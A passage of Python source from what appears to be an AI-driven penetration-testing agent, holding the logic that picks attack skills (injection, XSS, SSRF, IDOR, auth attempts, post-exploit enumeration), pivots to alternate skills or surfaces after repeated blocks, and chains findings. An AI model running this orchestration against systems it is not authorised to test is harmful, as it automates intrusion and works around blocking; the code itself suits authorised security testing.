                return ("run_skill", {"skill": skill, "target_url": target, "params": params})
            return None
        if any(token in blob for token in ("xss",)):
            skill = self._pivoted_skill_name("test_xss")
            if skill:
                return ("run_skill", {"skill": skill, "target_url": target, "params": self._best_skill_params(skill, hint_blob=blob)})
            return None
        if any(token in blob for token in ("ssrf",)):
            skill = self._pivoted_skill_name("test_ssrf")
            if skill:
                return ("run_skill", {"skill": skill, "target_url": target, "params": self._best_skill_params(skill, hint_blob=blob)})
            return None
        if any(token in blob for token in ("secret", "file", "git", "debug", "config", "exposed", "disclosure")):
            skill = self._pivoted_skill_name("test_sensitive_files")
            if skill:
                return ("run_skill", {"skill": skill, "target_url": target, "params": {}})
            return None
        skill = self._pivoted_skill_name("enumerate_endpoints")
        if skill:
            return ("run_skill", {"skill": skill, "target_url": target, "params": {}})
        return None

    def _forced_branch_action(self, branch: BranchState) -> tuple[str, dict[str, Any]] | None:
        allowed = self._platform_allowed_skills()
        if "run_skill" not in self.registry.list_tools() or not allowed:
            return None
        target = str(self.state.target)
        role = str(branch.role).lower()
        phase = str(branch.phase).lower()
        kind = self._target_kind_name()
        blob = " ".join(
            [
                str(branch.vector_id or ""),
                str(branch.title or ""),
                str(branch.objective or ""),
                str(branch.next_step or ""),
                str(branch.crown_jewel or ""),
            ]
        ).lower()
        shell_exec_failed = branch.last_tool == "shell_exec" and "exit=" in str(branch.last_summary).lower()
        if kind == "desktop":
            if any(token in blob for token in ("secret", "storage", "keychain")):
                skill = self._pivoted_skill_name("test_local_storage_secrets")
                if skill:
                    return ("run_skill", {"skill": skill, "target_url": target, "params": {}})
            if any(token in blob for token in ("ipc", "deeplink", "url scheme")):
                skill = self._pivoted_skill_name("test_ipc_injection") or self._pivoted_skill_name("test_deeplink_abuse")
                if skill:
                    return ("run_skill", {"skill": skill, "target_url": target, "params": {}})
            skill = self._pivoted_skill_name("test_signature_audit") or self._pivoted_skill_name("test_binary_protections")
            if skill:
                return ("run_skill", {"skill": skill, "target_url": target, "params": {}})
            return None
        if kind != "web":
            return None
        if role == "post_exploit_worker" or any(token in phase for token in ("privilege_probe", "data_access", "chain_closure")):
            if shell_exec_failed and any(token in blob for token in ("admin", "token", "session", "credential", "role", "export")):
                return ("http_request", {"method": "GET", "url": target.rstrip("/") + "/rest/user/whoami"})
            skill = self._pivoted_skill_name("post_auth_enum")
            if skill:
                params = self._best_skill_params(skill, hint_blob=blob)
                return ("run_skill", {"skill": skill, "target_url": target, "params": params})
            return None
        if any(token in blob for token in ("idor", "access_control", "broken access control", "object")):
            skill = self._pivoted_skill_name("test_idor")
            if skill:
                params = self._best_skill_params(skill, hint_blob=blob)
                return ("run_skill", {"skill": skill, "target_url": target, "params": params})
            return None
        if any(token in blob for token in ("auth", "login", "session", "token")):
            skill = self._pivoted_skill_name("attempt_auth")
            if skill:
                params = self._best_skill_params(skill, hint_blob=blob)
                if skill == "attempt_auth" and not params:
                    params = {}
                return ("run_skill", {"skill": skill, "target_url": target, "params": params})
            return None
        if any(token in blob for token in ("admin", "data", "profile", "account")):
            skill = self._pivoted_skill_name("post_auth_enum")
            if skill:
                params = self._best_skill_params(skill, hint_blob=blob)
                return ("run_skill", {"skill": skill, "target_url": target, "params": params})
            return None
        if any(token in blob for token in ("sqli", "sql", "injection", "nosql", "ssti")):
            skill = self._pivoted_skill_name("test_injection")
            if skill:
                params = self._best_skill_params(skill, hint_blob=blob)
                return ("run_skill", {"skill": skill, "target_url": target, "params": params})
            return None
        return None

    def _recent_blocked_skill_count(self, skill_name: str, *, window: int = 12) -> int:
        skill = str(skill_name).strip().lower()
        if not skill:
            return 0
        counted = int(self.state.blocked_skill_counts.get(skill, 0))
        total = 0
        for item in self.state.attempt_outcomes[-window:]:
            if item.tool != "run_skill" or item.status != "blocked":
                continue
            if f"\"skill\": \"{skill}\"" in item.args_preview or f"'skill': '{skill}'" in item.args_preview:
                total += 1
        return max(total, counted)

    def _target_kind_name(self) -> str:
        try:
            return str(getattr(self._target_kind, "value", self._target_kind)).lower()
        except Exception:
            return "web"

    def _platform_allowed_skills(self) -> set[str]:
        all_tools = set(self.registry.list_tools())
        if "run_skill" not in all_tools:
            return set()
        kind = self._target_kind_name()
        if kind == "desktop":
            return set(_DESKTOP_SKILLS)
        if kind == "web":
            return {
                "enumerate_endpoints",
                "test_sensitive_files",
                "test_infra",
                "attempt_auth",
                "post_auth_enum",
                "test_injection",
                "test_xss",
                "test_ssrf",
                "test_idor",
                "test_auth_deep",
                "test_csrf",
                "test_misconfig",
                "test_api_security",
                "test_business_logic",
                "test_crypto",
            }
        if kind in {"mobile", "code", "game"}:
            return set()
        return set()

    def _platform_skill_pivot_graph(self) -> dict[str, tuple[str, ...]]:
        kind = self._target_kind_name()
        if kind == "desktop":
            return _DESKTOP_PIVOT_SKILL_GRAPH
        if kind == "web":
            return _WEB_PIVOT_SKILL_GRAPH
        return {}

    def _pivoted_skill_name(self, requested_skill: str) -> str:
        skill = str(requested_skill).strip().lower()
        if not skill:
            return ""
        allowed = self._platform_allowed_skills()
        if skill not in allowed:
            return ""
        graph = self._platform_skill_pivot_graph()
        blocked = self._recent_blocked_skill_count(skill)
        if blocked < 3:
            return skill
        for alt in graph.get(skill, ()):
            if alt in allowed and self._recent_blocked_skill_count(alt) < 3:
                return alt
        return ""

    def _normalize_skill_params(self, skill_name: str, params: dict[str, Any] | None = None) -> dict[str, Any]:
        skill = str(skill_name).strip().lower()
        normalized = dict(params or {})
        target = str(self.state.target)
        if skill in {"post_auth_enum", "test_idor"}:
            if not any(key in normalized for key in ("base_url", "url_pattern", "token")):
                normalized["base_url"] = target
        elif skill in {
            "test_injection",
            "test_xss",
            "test_ssrf",
            "test_api_security",
            "test_business_logic",
        }:
            if "url" not in normalized and "url_pattern" not in normalized:
                normalized["url"] = target
        return normalized

    def _known_surface_urls(self) -> list[str]:
        urls: list[str] = []
        seen: set[str] = set()

        def _remember(value: str) -> None:
            clean = str(value or "").strip()
            if not clean or clean in seen:
                return
            seen.add(clean)
            urls.append(clean)

        for message in self.state.messages:
            content = message.get("content", {})
            if not isinstance(content, dict):
                continue
            args = content.get("args", {})
            result = content.get("result", {})
            if isinstance(args, dict):
                for key in ("url", "target_url", "affected_component"):
                    if args.get(key):
                        _remember(str(args[key]))
            if isinstance(result, dict):
                data = result.get("data", {})
                if isinstance(data, dict):
                    for key in ("url", "affected_component"):
                        if data.get(key):
                            _remember(str(data[key]))
                    for ep in data.get("accessible", []) or []:
                        if isinstance(ep, dict) and ep.get("path"):
                            path = str(ep["path"])
                            if path.startswith("http"):
                                _remember(path)
                            else:
                                _remember(self.state.target.rstrip("/") + path)
        for finding in self.state.findings:
            component = str(finding.get("affected_component", "") or "")
            if component:
                _remember(component)
        return urls

    def _recent_skill_surface_counts(self, skill_name: str, *, window: int = 24) -> dict[str, int]:
        skill = str(skill_name).strip().lower()
        if not skill:
            return {}
        counts: dict[str, int] = {}
        for message in self.state.messages[-window:]:
            if message.get("role") != "tool":
                continue
            content = message.get("content", {})
            if not isinstance(content, dict) or content.get("name") != "run_skill":
                continue
            args = content.get("args", {})
            if not isinstance(args, dict):
                continue
            real_skill = str(args.get("skill") or "").strip().lower()
            if real_skill != skill:
                continue
            params = args.get("params", {}) if isinstance(args.get("params"), dict) else {}
            surface = str(
                params.get("url")
                or params.get("url_pattern")
                or params.get("base_url")
                or args.get("target_url")
                or ""
            ).strip()
            if not surface:
                continue
            counts[surface] = counts.get(surface, 0) + 1
        return counts

    def _surface_candidates_for_skill(self, skill_name: str, *, hint_blob: str = "") -> list[str]:
        skill = str(skill_name).strip().lower()
        target = str(self.state.target).rstrip("/")
        urls = self._known_surface_urls()
        blob = hint_blob.lower()
        seen: set[str] = set()
        ordered: list[str] = []

        def _push(url: str) -> None:
            clean = str(url or "").strip()
            if not clean or clean in seen:
                return
            seen.add(clean)
            ordered.append(clean)

        def _matches(url: str) -> bool:
            lower = url.lower()
            if skill == "test_injection":
                return "?" in lower and any(token in lower for token in ("search", "login", "q=", "query", "filter"))
            if skill == "test_xss":
                return "?" in lower and any(token in lower for token in ("search", "q=", "query", "return", "redirect", "next", "message", "comment"))
            if skill == "test_ssrf":
                return any(token in lower for token in ("url=", "uri=", "dest=", "redirect", "next=", "callback", "return", "proxy", "fetch"))
            if skill in {"test_api_security", "test_business_logic"}:
                return any(token in lower for token in ("/api/", "order", "cart", "checkout", "profile", "account"))
            return False

        if blob:
            for url in urls:
                lower = url.lower()
                if any(token and token in lower for token in re.split(r"[^a-z0-9_/.-]+", blob) if len(token) >= 4):
                    _push(url)

        for url in urls:
            if _matches(url):
                _push(url)
        for url in urls:
            if "?" in url:
                _push(url)
        if skill == "test_injection":
            _push(f"{target}/search?q=test")
        elif skill == "test_xss":
            _push(f"{target}/search?q=test")
            _push(f"{target}/redirect?next=/profile")
        elif skill == "test_ssrf":
            _push(f"{target}/redirect?url=http://example.com")
            _push(f"{target}/proxy?url=http://example.com")
        elif skill in {"test_api_security", "test_business_logic"}:
            _push(target)
        return ordered

    def _best_skill_params(self, skill_name: str, *, hint_blob: str = "") -> dict[str, Any]:
        skill = str(skill_name).strip().lower()
        target = str(self.state.target).rstrip("/")
        urls = self._known_surface_urls()
        blob = hint_blob.lower()

        def _pick(predicate: Callable[[str], bool]) -> str | None:
            for url in urls:
                lower = url.lower()
                if predicate(lower):
                    return url
            return None

        def _seed_paths(limit: int = 8) -> list[str]:
            seen: set[str] = set()
            out: list[str] = []
            for url in urls:
                parsed = urlparse(url)
                path = (parsed.path or "/").strip()
                if not path or path == "/":
                    continue
                if len(path) > 1:
                    path = path.rstrip("/")
                if path in seen:
                    continue
                seen.add(path)
                out.append(path)
                if len(out) >= limit:
                    break
            return out

        def _pick_untried(candidates: list[str]) -> str | None:
            recent = self._recent_skill_surface_counts(skill)
            scored = sorted(
                enumerate(candidates),
                key=lambda item: (recent.get(item[1], 0), item[0]),
            )
            return scored[0][1] if scored else None

        if skill == "test_injection":
            picked = _pick_untried(self._surface_candidates_for_skill(skill, hint_blob=blob)) or (
                _pick(lambda u: "?" in u and any(token in u for token in ("search", "login", "q=", "query", "filter")))
                or _pick(lambda u: "?" in u)
                or f"{target}/search?q=test"
            )
            return {"url": picked}
        if skill == "test_xss":
            picked = _pick_untried(self._surface_candidates_for_skill(skill, hint_blob=blob)) or (
                _pick(lambda u: "?" in u and any(token in u for token in ("search", "q=", "query", "return", "redirect", "next")))
                or _pick(lambda u: "?" in u)
                or f"{target}/search?q=test"
            )
            return {"url": picked}
        if skill == "test_ssrf":
            picked = _pick_untried(self._surface_candidates_for_skill(skill, hint_blob=blob)) or (
                _pick(lambda u: any(token in u for token in ("url=", "uri=", "dest=", "redirect", "next=", "callback", "return")))
                or f"{target}/redirect?url=http://example.com"
            )
            return {"url": picked}
        if skill == "test_idor":
            picked = _pick(lambda u: bool(re.search(r"/\d+(?:/|$)", u)))
            token = self._latest_auth_token()
            if picked:
                pattern = re.sub(r"/\d+(?=(/|$))", "/{id}", picked, count=1)
                params = {"url_pattern": pattern}
                if token:
                    params["token"] = token
                    params["max_id"] = 30
                return params
            params = {"base_url": target}
            if token:
                params["token"] = token
                params["max_id"] = 30
            return params
        if skill in {"test_api_security", "test_business_logic"}:
            picked = (
                _pick(lambda u: any(token in u for token in ("/api/", "order", "cart", "checkout", "profile", "account")))
                or target
            )
            return {"url": picked}
        if skill == "post_auth_enum":
            return {"base_url": target}
        if skill == "test_infra":
            return {"seed_paths": _seed_paths()}
        return {}

    def _skill_supports_surface_retry(self, skill_name: str) -> bool:
        return str(skill_name).strip().lower() in {
            "test_injection",
            "test_xss",
            "test_ssrf",
            "test_api_security",
            "test_business_logic",
        }

    def _should_retry_skill_on_fresh_surface(
        self,
        skill_name: str,
        current_params: dict[str, Any] | None = None,
    ) -> bool:
        skill = str(skill_name).strip().lower()
        if not self._skill_supports_surface_retry(skill):
            return False
        params = dict(current_params or {})
        current_surface = str(
            params.get("url") or params.get("url_pattern") or params.get("base_url") or ""
        ).strip()
        alternatives = self._surface_candidates_for_skill(skill)
        if current_surface and any(surface != current_surface for surface in alternatives):
            return True
        fresh = self._best_skill_params(skill)
        next_surface = str(
            fresh.get("url") or fresh.get("url_pattern") or fresh.get("base_url") or ""
        ).strip()
        if not current_surface or not next_surface:
            return False
        return current_surface != next_surface

    def _alternate_surface_params(
        self,
        skill_name: str,
        current_params: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        skill = str(skill_name).strip().lower()
        params = dict(current_params or {})
        current_surface = str(
            params.get("url") or params.get("url_pattern") or params.get("base_url") or ""
        ).strip()
        for surface in self._surface_candidates_for_skill(skill):
            if surface and surface != current_surface:
                if skill == "test_idor":
                    return {"url_pattern": surface}
                if skill == "post_auth_enum":
                    return {"base_url": surface}
                return {"url": surface}
        return self._best_skill_params(skill)

    def _reroute_blocked_skill(
        self,
        requested_skill: str,
        params: dict[str, Any] | None = None,
    ) -> tuple[str, dict[str, Any]]:
        skill = str(requested_skill).strip().lower()
        if not skill:
            return "", dict(params or {})
        if self._recent_blocked_skill_count(skill) >= 3 and self._should_retry_skill_on_fresh_surface(skill, params):
            return skill, self._normalize_skill_params(skill, self._alternate_surface_params(skill, params))
        rerouted = self._pivoted_skill_name(skill)
        if not rerouted:
            if self._recent_blocked_skill_count(skill) >= 3:
                return "", dict(params or {})
            rerouted = skill
        return rerouted, self._normalize_skill_params(rerouted, params)

    def _forced_replan_action(self, rejection_title: str) -> tuple[str, dict[str, Any], str] | None:
        title = str(rejection_title or "").strip().lower()
        if title == "needs_chains" and "link_chain" in self.registry.list_tools():
            candidates = self._suggest_chain_candidates(limit=1)
            if candidates:
                cand = candidates[0]
                return (
                    "link_chain",
                    {
                        "finding_ids": [cand["source_id"], cand["target_id"]],
                        "rationale": cand["rationale"],
                        "crown_jewel": cand["crown_jewel"],
                    },
                    f"forcing chain link {cand['source_id']} -> {cand['target_id']}",
                )
        if title == "unfinished_branches":
            focus = self._focus_branch()
            if focus is None:
                blockers = self._blocking_finish_branches()
                focus = blockers[0] if blockers else None
            if focus is not None:
                forced = self._forced_branch_action(focus)
                if forced is not None:
                    return forced[0], forced[1], f"forcing branch advancement on {focus.id}"
            try:
                from vxis.agent.tools.finding_tools import _get_findings
                findings = list(_get_findings() or [])
            except Exception:
                findings = []
            retryable_candidates = self._retryable_family_candidates(findings)
            if retryable_candidates:
                forced = self._forced_candidate_action(retryable_candidates[0])
                if forced is not None:
                    family = self._candidate_family(retryable_candidates[0])
                    return forced[0], forced[1], f"forcing deeper retry on {family} family via {retryable_candidates[0].id}"
            family_candidates = self._remaining_high_yield_family_candidates(findings)
            if family_candidates:
                forced = self._forced_candidate_action(family_candidates[0])
                if forced is not None:
                    family = self._candidate_family(family_candidates[0])
                    return forced[0], forced[1], f"forcing remaining {family} family exploration via {family_candidates[0].id}"
        if title == "unattempted_candidates":
            try:
                from vxis.agent.tools.finding_tools import _get_findings
                findings = list(_get_findings() or [])
            except Exception:
                findings = []
            retryable_candidates = self._retryable_family_candidates(findings)
            if retryable_candidates:
                forced = self._forced_candidate_action(retryable_candidates[0])
                if forced is not None:
                    return forced[0], forced[1], f"forcing retryable candidate {retryable_candidates[0].id}"
            open_candidates = self._remaining_high_yield_family_candidates(findings)
            if open_candidates:
                forced = self._forced_candidate_action(open_candidates[0])
                if forced is not None:
                    return forced[0], forced[1], f"forcing first attempt on {open_candidates[0].id}"
        return None

    @staticmethod
    def _chainable_findings(findings: list[dict[str, Any]]) -> list[dict[str, Any]]:
        """Return findings that are realistic building blocks for attack chains."""
        try:
            from vxis.agent.tools.finding_tools import _canonical_finding_type
        except Exception:
            def _canonical_finding_type(value: str) -> str:
                return str(value or "").lower().strip()

        chainable_types = {
            "weak_auth",
            "information_disclosure",
            "misconfiguration",
            "broken_access_control",
            "idor",
            "sql_injection",
            "xss",
            "ssrf",
            "csrf",
            "insecure_deserialization",
            "command_injection",
            "path_traversal",
            "business_logic",
        }
        out: list[dict[str, Any]] = []
        for finding in findings:
            severity = str(finding.get("severity", "low")).lower()
            if severity not in {"critical", "high", "medium"}:
                continue
            ftype = _canonical_finding_type(str(finding.get("finding_type", "")))
            if ftype in chainable_types:
                out.append(finding)
        return out

    def _desired_chain_count(self, findings: list[dict[str, Any]]) -> int:
        chainable = self._chainable_findings(findings)
        if len(chainable) < 2:
            return 0
        if len(chainable) < 4:
            return 1
        return max(2, len(chainable) // 3)

    def _focus_branch(self) -> BranchState | None:
        active = self.state.active_branches()
        if not active:
            return None
        return active[0]

    def _llm_discipline_profile(self) -> str:
        provider = str(getattr(self.brain, "_provider", "") or "").lower()
        model = str(getattr(self.brain, "_model", "") or "").lower()
        if provider in {"llamacpp", "ollama"}:
            return "local_strict"
        if (
            provider in {"openai", "anthropic", "gemini", "google"}
            and (
                any(token in model for token in ("gpt-5.5", "gpt-5.4", "claude-opus", "claude-sonnet", "gemini-2.5-pro"))
                or "opus" in model
                or "sonnet" in model
            )
        ):
            return "frontier_loose"
        if provider:
            return "cloud_balanced"
        return "default"

    def _focus_grace_iterations(self) -> int:
        base = min(8, max(3, self.state.max_iters // 12))
        profile = self._llm_discipline_profile()
        if profile == "local_strict":
            return max(2, base - 2)
        if profile == "cloud_balanced":
            return min(10, base + 1)
        if profile == "frontier_loose":
            return min(12, base + 3)
        return base

    def _focus_drift_block_threshold(self) -> int:
        profile = self._llm_discipline_profile()
        if profile == "local_strict":
            return 2
        if profile == "cloud_balanced":
            return 3
        if profile == "frontier_loose":
            return 4
        return 2

    def _off_branch_capability_thresholds(self) -> tuple[int, int, int]:
        profile = self._llm_discipline_profile()
        if profile == "local_strict":
            return (18, 20, 14)
        if profile == "cloud_balanced":
            return (14, 18, 0)
        if profile == "frontier_loose":
            return (10, 16, 0)
        return (12, 18, 0)

    def _action_capability_score(self, name: str, args: dict[str, Any] | Any) -> int:
        capability = self._action_capability(name, args)
        return {
            "recon": 22,
            "plan": 18,
            "probe": 14,
            "browse": 12,
            "review": 10,
            "report": 8,
            "chain": 8,
            "exploit": 6,
            "retrieve": 6,
            "control": 4,
            "memory": 4,
        }.get(capability, 0)

    def _should_allow_off_branch_action(
        self,
        branch: BranchState | None,
        name: str,
        args: dict[str, Any] | Any,
        matched_branch_ids: list[str],
        matched_candidate_ids: list[str],
    ) -> bool:
        if branch is None:
            return True
        if name in {"finish_scan", "link_chain"}:
            return True
        findings_count = len(self.state.findings)
        cap_score = self._action_capability_score(name, args)
        grace_threshold, free_threshold, uncovered_family_floor = self._off_branch_capability_thresholds()
        if self.state.iteration <= self._focus_grace_iterations() and findings_count == 0:
            return cap_score >= grace_threshold
        if cap_score >= free_threshold:
            return True
        if matched_branch_ids and any(self._branch_same_campaign(branch, branch_id) for branch_id in matched_branch_ids):
            return True
        if self._is_high_value_cross_campaign_exception(
            branch,
            matched_branch_ids=matched_branch_ids,
            matched_candidate_ids=matched_candidate_ids,
            capability_score=cap_score,
        ):
            return True
        if matched_candidate_ids:
            focus_family = self._branch_family(branch)
            for candidate_id in matched_candidate_ids:
                candidate = self.state.vector_candidates.get(candidate_id)
                if candidate is None:
                    continue
                candidate_family = self._candidate_family(candidate)
                if candidate_family != focus_family and candidate_family != "generic":
                    related = self._family_related_types(candidate_family)
                    found_types = {
                        str(item.get("finding_type", "")).strip().lower()
                        for item in self.state.findings
                        if isinstance(item, dict)
                    }
                    if not (related & found_types):
                        if uncovered_family_floor and cap_score < uncovered_family_floor:
                            continue
                        return True
        if matched_branch_ids and any(str(branch_id).startswith(("memory:", "carry:")) for branch_id in matched_branch_ids):
            return True
        return False

    def _is_high_value_cross_campaign_exception(
        self,
        branch: BranchState,
        *,
        matched_branch_ids: list[str],
        matched_candidate_ids: list[str],
        capability_score: int,
    ) -> bool:
        if capability_score < 12:
            return False
        focus_family = self._branch_family(branch)
        if focus_family not in {"auth", "injection"}:
            return False
        if branch.role != "post_exploit_worker" and branch.phase not in {"session_reuse", "privilege_probe", "data_access"}:
            return False
        target_families: set[str] = set()
        for branch_id in matched_branch_ids:
            other = self.state.branches.get(branch_id)
            if other is None:
                continue
            target_families.add(self._branch_family(other))
        for candidate_id in matched_candidate_ids:
            candidate = self.state.vector_candidates.get(candidate_id)
            if candidate is None:
                continue
            target_families.add(self._candidate_family(candidate))
        target_families.discard("generic")
        target_families.discard(focus_family)
        if not target_families:
            return False
        if not (target_families & {"idor", "disclosure", "xss", "ssrf"}):
            return False
        try:
            from vxis.agent.tools.finding_tools import _canonical_finding_type as _canon_ft
        except Exception:
            _canon_ft = lambda value: str(value or "").strip().lower()
        found_types = {
            _canon_ft(str(item.get("finding_type", "")))
            for item in self.state.findings
            if isinstance(item, dict)
        }
        if focus_family == "injection" and "sql_injection" not in found_types:
            return False
        if focus_family == "auth" and not ({"weak_auth", "sql_injection"} & found_types):
            return False
        return True

    @staticmethod
    def _branch_lineage_match(branch: BranchState, branch_id: str) -> bool:
        if not branch_id:
            return False
        return (
            branch_id == branch.id
            or branch_id.startswith(f"{branch.id}:")
            or branch.id.startswith(f"{branch_id}:")
        )

    def _branch_same_campaign(self, branch: BranchState, branch_id: str) -> bool:
        other = self.state.branches.get(branch_id)
        if other is None:
            return False
        if branch.source_finding_id and other.source_finding_id and branch.source_finding_id == other.source_finding_id:
            return True
        if branch.parent_branch_id and other.parent_branch_id and branch.parent_branch_id == other.parent_branch_id:
            return True
        if branch.source_candidate_id and other.source_candidate_id and branch.source_candidate_id == other.source_candidate_id:
            return True
        return False

    def _branch_focus_terms(self, branch: BranchState) -> list[str]:
        terms: list[str] = []
        terms.extend(branch.watch_terms or [])
        raw_fields = [
            branch.vector_id,
            branch.title,
            branch.objective,
            branch.next_step,
            branch.crown_jewel,
            branch.evidence,
        ]
        for field_value in raw_fields:
            blob = str(field_value or "").lower()
            if blob:
                terms.append(blob)
                terms.extend(
                    token for token in re.findall(r"[a-z0-9_./:-]{4,}", blob)
                    if token not in {
                        "http",
                        "https",
                        "with",
                        "then",
                        "into",
                        "from",
                        "that",
                        "this",
                        "real",
                        "impact",
                    }
                )
        deduped: list[str] = []
        seen: set[str] = set()
        for term in terms:
            clean = str(term).strip().lower()
            if len(clean) < 4 or clean in seen:
                continue
            seen.add(clean)
            deduped.append(clean)
        return deduped

    def _action_advances_focus_branch(
        self,
        branch: BranchState | None,
        name: str,
        args: dict[str, Any] | Any,
        matched_branch_ids: list[str],
    ) -> bool:
        if branch is None:
            return True
        if name in {"finish_scan", "link_chain"}:
            return True
        if not self._role_allows_action(branch.role, name, args):
            return False
        if not self._phase_allows_action(branch, name, args):
            return False
        if name == "report_finding":
            return bool(matched_branch_ids) or bool(branch.source_candidate_id or branch.source_finding_id)
        if any(self._branch_lineage_match(branch, branch_id) for branch_id in matched_branch_ids):
            return True
        blob = f"{name} {self._preview_args(args)}".lower()
        return any(term in blob for term in self._branch_focus_terms(branch))

    def _memory_profile(self) -> dict[str, Any]:
        profile = getattr(self, "_target_memory_profile", None)
        return profile if isinstance(profile, dict) else {}

    def _matches_refuted_memory_pattern(self, args: dict[str, Any]) -> dict[str, Any] | None:
        profile = self._memory_profile()
        refuted = list(profile.get("refuted_patterns") or [])
        if not refuted:
            return None
        ftype = str(args.get("finding_type", "")).lower().strip()
        component = str(args.get("affected_component", "")).strip().lower()
        for item in refuted:
            if not isinstance(item, dict):
                continue
            mem_type = str(item.get("finding_type", "")).lower().strip()
            mem_component = str(item.get("affected_component", "")).strip().lower()
            if not mem_type or not mem_component:
                continue
            if mem_type == ftype and mem_component == component:
                return item
        return None

    def _memory_action_components(self, name: str, args: dict[str, Any] | Any) -> list[str]:
        if not isinstance(args, dict):
            return []
        components: list[str] = []
        if name == "report_finding":
            component = str(args.get("affected_component", "")).strip().lower()
            if component:
                components.append(component)
        elif name == "run_skill":
            target_url = str(args.get("target_url", "")).strip().lower()
            if target_url:
                components.append(target_url)
            params = args.get("params") or {}
            if isinstance(params, dict):
                for key in ("url", "url_pattern", "path", "endpoint"):
                    value = str(params.get(key, "")).strip().lower()
                    if value:
                        components.append(value)
        else:
            for key in ("url", "target_url", "path", "endpoint"):
                value = str(args.get(key, "")).strip().lower()
                if value:
                    components.append(value)
        deduped: list[str] = []
        for value in components:
            if value and value not in deduped:
                deduped.append(value)
        return deduped

    def _memory_action_finding_types(self, name: str, args: dict[str, Any] | Any) -> list[str]:
        if not isinstance(args, dict):
            return []
        if name == "report_finding":
            value = str(args.get("finding_type", "")).strip().lower()
            return [value] if value else []
        if name != "run_skill":
            return []
        skill = str(args.get("skill", "")).strip().lower()
        skill_map = {
            "enumerate_endpoints": ["error_oracle"],
            "test_sensitive_files": ["information_disclosure"],
            "test_injection": ["sql_injection", "xss_reflected", "ssti", "nosql", "error_oracle"],
            "test_xss": ["xss_reflected"],
            "test_ssrf": ["ssrf"],
            "attempt_auth": ["weak_auth", "auth_bypass"],
            "test_idor": ["idor", "broken_access_control"],
            "post_auth_enum": ["information_disclosure", "broken_access_control"],
            "test_auth_deep": ["weak_auth", "auth_bypass"],
            "test_api_security": ["mass_assignment", "weak_auth"],
            "test_misconfig": ["information_disclosure", "error_oracle"],
        }
        return list(skill_map.get(skill, []))

    def _matches_refuted_memory_action(self, name: str, args: dict[str, Any] | Any) -> dict[str, Any] | None:
        profile = self._memory_profile()
        refuted = list(profile.get("refuted_patterns") or [])
        if not refuted:
            return None
        action_types = self._memory_action_finding_types(name, args)
        action_components = self._memory_action_components(name, args)
        if not action_types or not action_components:
            return None
        for item in refuted:
            if not isinstance(item, dict):
                continue
            mem_type = str(item.get("finding_type", "")).strip().lower()
            mem_component = str(item.get("affected_component", "")).strip().lower()
            if not mem_type or not mem_component or mem_type not in action_types:
                continue
            if any(mem_component in component or component in mem_component for component in action_components):
                return item
        return None

    def _matching_successful_memory_tactic(self, name: str, args: dict[str, Any] | Any) -> dict[str, Any] | None:
        profile = self._memory_profile()
        tactics = list(profile.get("successful_tactics") or [])
        if not tactics:
            return None
        action_types = self._memory_action_finding_types(name, args)
        action_components = self._memory_action_components(name, args)
        if not action_types and not action_components:
            return None
        for item in tactics:
            if not isinstance(item, dict):
                continue
            mem_type = str(item.get("finding_type", "")).strip().lower()
            mem_component = str(item.get("affected_component", "")).strip().lower()
            if action_types and mem_type and mem_type not in action_types:
                continue
            if action_components and mem_component:
                if not any(mem_component in component or component in mem_component for component in action_components):
                    continue
            return item
        return None

    def _should_pressure_memory_revalidation(
        self,
        name: str,
        args: dict[str, Any] | Any,
        matched_branch_ids: list[str],
    ) -> bool:
        if self.state.iteration > 6:
            return False
        profile = self._memory_profile()
        if not profile.get("target_known"):
            return False
        if not (profile.get("known_findings") or profile.get("branch_leads")):
            return False
        if any(str(branch_id).startswith("carry:") or str(branch_id).startswith("memory:") for branch_id in matched_branch_ids):
            return False
        if name in {"finish_scan", "link_chain", "query_scan_memory"}:
            return False
        if self._action_capability(name, args) in {"report", "review", "chain"}:
            return False
        if self._matching_successful_memory_tactic(name, args) is not None:
            return False
        return True

    async def _director_decide(self) -> tuple[str, dict[str, Any]] | None:
        """Strategic Director: stronger model decides the EXACT next tool call.

        Called every critic_interval iterations. Unlike the old critic (which
        gave prose advice Brain ignored), the director outputs executable JSON
        that the scan loop dispatches directly. This is the hybrid pattern:
        gpt-5.4 full for strategy, gpt-5.4-mini for routine execution.

        Returns (tool_name, args) or None if unavailable.
        """
        import asyncio
        import json as _jd
        if self.brain is None or not hasattr(self.brain, "_call_llm_with_fallback"):
            return None
        try:
            from vxis.agent.tools.finding_tools import _get_findings
            current_findings = _get_findings()
        except Exception:
            current_findings = []

        # Build recent action summary
        recent: list[str] = []
        for m in self.state.messages[-20:]:
            c = m.get("content")
            if isinstance(c, dict):
                name = c.get("name", "?")
                summary = (c.get("result") or {}).get("summary", "")[:100]
                recent.append(f"  {name}: {summary}")

        findings_summary = "\n".join(
            f"  [{f['severity']}] {f['finding_type']}: {f.get('title','')[:80]}"
            for f in current_findings[:10]
        ) or "  (none yet)"

        # Build vector status from dashboard
        vector_status = self._build_scan_dashboard()

        prompt = DIRECTOR_PROMPT_TEMPLATE.format(
            target=self.state.target,
            iteration=self.state.iteration,
            max_iters=self.state.max_iters,
            finding_count=len(current_findings),
            vector_status=vector_status,
            recent_actions="\n".join(recent[-10:]) or "  (no actions)",
            findings_list=findings_summary,
        )

        # Use gpt-5.4 full for strategic decision
        import os
        orig_model = getattr(self.brain, "_model", None)
        use_stronger = False
        if (
            getattr(self.brain, "_provider", None) == "openai"
            and os.environ.get("OPENAI_API_KEY")
            and orig_model
            and "mini" in str(orig_model)
        ):
            self.brain._model = "gpt-5.4"
            use_stronger = True

        try:
            response = await asyncio.to_thread(
                self.brain._call_llm_with_fallback,
                "Output ONLY a JSON object: {\"tool\": \"...\", \"args\": {...}}. No prose.",
                prompt,
            )
        except Exception as e:
            logger.warning("director_decide failed: %s", e)
            return None
        finally:
            if use_stronger and orig_model is not None:
                self.brain._model = orig_model

        if not response:
            return None

        # Parse the JSON tool call
        try:
            # Try to extract JSON from response
            text = response.strip()
            # Handle markdown fences
            if "```" in text:
                import re
                m = re.search(r"```(?:json)?\s*(\{.*?\})\s*```", text, re.DOTALL)
                if m:
                    text = m.group(1)
            data = _jd.loads(text)
            tool = str(data.get("tool", ""))
            args = data.get("args", {})
            if tool and tool in self.registry.list_tools():
                logger.info("director: decided %s(%s)", tool, str(args)[:100])
                return (tool, args if isinstance(args, dict) else {})
        except Exception:
            logger.debug("director: failed to parse response: %s", response[:200])
        return None

    async def run(self) -> dict[str, Any]:
        import json as _json
        import re as _re
        try:
            from vxis.agent.memory_compressor import reset_memory_compression_stats
            reset_memory_compression_stats()
        except Exception:
            pass
        from vxis.interaction.surface import TargetKind as _TK

        self.state.add_message("system", f"Scan started on {self.state.target}")
